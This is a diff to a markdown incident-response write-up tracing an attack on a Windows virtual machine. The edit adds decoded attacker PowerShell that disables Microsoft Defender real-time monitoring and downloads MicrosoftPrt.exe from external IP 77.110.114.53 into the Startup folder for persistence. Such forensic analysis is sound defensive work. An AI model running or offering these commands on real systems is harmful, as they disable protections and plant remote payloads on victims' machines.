@@ -175,31 +175,32 @@ Decoded PowerShell "Get-MpPreference | fl DisableRealtimeMonitoring, ExclusionPa
 
 Shortly after performing reconnaissance, PowerShell commands were used to modify Microsoft Defender.
 
-Real-time monitoring was disabled and multiple Defender exclusion paths were added, including the newly created `C:\users\Migration` directory.
+Real-time monitoring was disabled.
 
-<p align="center">
-  <img src="SCREENSHOT-URL-HERE" width="1200" alt="Microsoft Defender Tampering">
-</p>
+Decoded PowerShell "Set-MpPreference -DisableRealtimeMonitoring $True"
+
+![Workbook Image](https://imgur.com/8I92nGm.png)https://imgur.com/IQfbgUP
 
 ---
 
 ### 4. Payload Downloads — 6:38:39 PM to 6:38:50 PM
 
-Multiple executable files were downloaded from the external IP address **77.110.114.53**.
+At **6:38:39 PM**, an encoded PowerShell command was executed under the `administrator` account to download `MicrosoftPrt.exe` from the external IP address **77.110.114.53**.
 
-The downloaded files included:
+The file was saved to:
 
-* `MicrosoftPrt.exe`
-* `svchosl.exe`
-* `run.exe`
-* `Wmiic.exe`
-* `browse.exe`
+`C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\MicrosoftPrt.exe`
 
-Several files were placed inside `C:\users\Migration`, while others were placed inside the Windows Startup directory.
+The Windows Startup directory can automatically execute programs when a user logs in, making this location useful for establishing persistence on the compromised system.
+```kusto
+Decoded PowerShell
 
-<p align="center">
-  <img src="SCREENSHOT-URL-HERE" width="1200" alt="Payload Downloads">
-</p>
+(new-object System.Net.WebClient).DownloadFile(
+'http://77.110.114.53/MicrosoftPrt.exe',
+'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\MicrosoftPrt.exe'
+)
+```
+![Workbook Image](https://imgur.com/IQfbgUP.png)
 
 ---
 
@@ -209,9 +210,7 @@ The downloaded `Wmiic.exe` executable was then used to install a service named `
 
 The service was configured to execute `svchosl.exe`, establishing persistence on the compromised virtual machine.
 
-<p align="center">
-  <img src="SCREENSHOT-URL-HERE" width="1200" alt="Persistence Established">
-</p>
+![Workbook Image](https://imgur.com/SD8ORHb.png)
 
 ---
 
@@ -230,6 +229,3 @@ The service was configured to execute `svchosl.exe`, establishing persistence on
      ↓
 6:39:00 PM — Persistence established using WMServices
 ```
-
-The process activity following the successful authentication provides evidence that the account was used to execute commands, weaken endpoint security controls, download additional executables, establish persistence, and obtain SYSTEM-level execution on the affected virtual machine.
-
